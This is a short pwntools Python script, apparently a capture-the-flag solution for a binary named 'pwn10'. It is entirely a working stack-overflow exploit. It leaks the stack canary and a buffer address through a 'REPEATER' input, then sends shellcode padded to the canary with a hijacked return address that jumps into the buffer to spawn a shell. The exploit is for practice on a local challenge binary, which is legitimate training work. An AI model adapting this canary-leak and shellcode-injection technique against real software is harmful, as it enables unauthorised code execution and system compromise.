from pwn import *

context.binary = './pwn10'
p = process('./pwn10')

shellcode = asm(shellcraft.sh())  # Or your manual one

# Step 1: leak canary
payload = b'REPEATER'  # triggers recursion
payload += b'A' * (96 - len(payload))
p.sendline(payload)
p.recvline()
canary_leak = u64(p.recvline()[0:8].strip().ljust(8, b'\x00'))
canary = (canary_leak & 0xffffffffffffff) << 8
print(f"Canary: {hex(canary)}")

# Step 2: leak buffer address
payload = b'REPEATER' + b'B'*96
p.sendline(payload)
p.recvline()
p.recvline()
addr_leak = u64(p.recvline()[-7:].strip().ljust(8, b'\x00'))
buf_addr = addr_leak - 0x70
print(f"Buffer: {hex(buf_addr)}")

# Step 3: send final stage — shellcode + canary + RIP hijack
# !!! No "REPEATER" here !!!
payload = shellcode
payload += b'A' * (0x68 - len(shellcode))  # to canary
payload += p64(canary)
payload += b'B' * 8  # RBP
payload += p64(buf_addr)  # RIP -> jump to shellcode

p.sendline(payload)
p.interactive()
